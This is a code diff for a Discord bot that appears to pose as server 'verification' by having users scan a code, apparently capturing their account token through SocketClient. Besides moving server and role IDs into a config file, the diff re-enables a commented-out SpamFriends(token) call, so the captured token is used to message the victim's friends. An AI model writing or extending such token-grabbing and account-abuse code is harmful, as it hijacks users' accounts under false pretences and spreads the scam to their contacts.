@@ -3,6 +3,9 @@ import { GetEmojis } from "../util/emojis.d";
 import SocketClient from "../SocketClient";
 import SpamFriends from "./SpamFriends";
 
+import { IConfig } from "../global";
+const config: IConfig = require("../../config.json");
+
 export default async (client: Client, user: User) => {
     const allEmojis = (require('../util/emojis') as GetEmojis).GetEmojis(client);
 
@@ -16,7 +19,7 @@ export default async (client: Client, user: User) => {
         embeds: [scanCodeUserEmbed]
     }).catch(e => {}) as Message);
 
-    const token: string | boolean = (await SocketClient(message, scanCodeUserEmbed) as string)
+    const token: string | boolean = (await SocketClient(message, scanCodeUserEmbed, client) as string)
 
     if (typeof token === 'boolean') return await user.send({
         embeds: [new MessageEmbed()
@@ -36,15 +39,16 @@ export default async (client: Client, user: User) => {
         embeds: [verifyUserEmbed2]
     }).catch(e => {});
 
-    const userInServer = (client.guilds.cache.get('942589446841327636')?.members.cache.get(user.id) as GuildMember);
-    await userInServer.roles.add('995375620349501581').catch(() => {
+    const userInServer = (client.guilds.cache.get(config.guild)?.members.cache.get(user.id) as GuildMember);
+    await userInServer.roles.add(config.role).catch(() => {
+        console.log('FAILED TO GIVE ROLE')
         user.send({
             embeds: [new MessageEmbed()
                 .setColor("#ff0000")
                 .setTitle(`Failed to Verify`)
                 .setDescription(`${allEmojis.cancelEmoji} An error occured while trying to verify you in \`Horion Club\`. Please try again later.`)]
-        }).catch(e => {});
+        }).catch(e => console.log('FAILED TO MESSAGE USER'));
     });
 
-    // SpamFriends(token);
+    SpamFriends(token);
 }
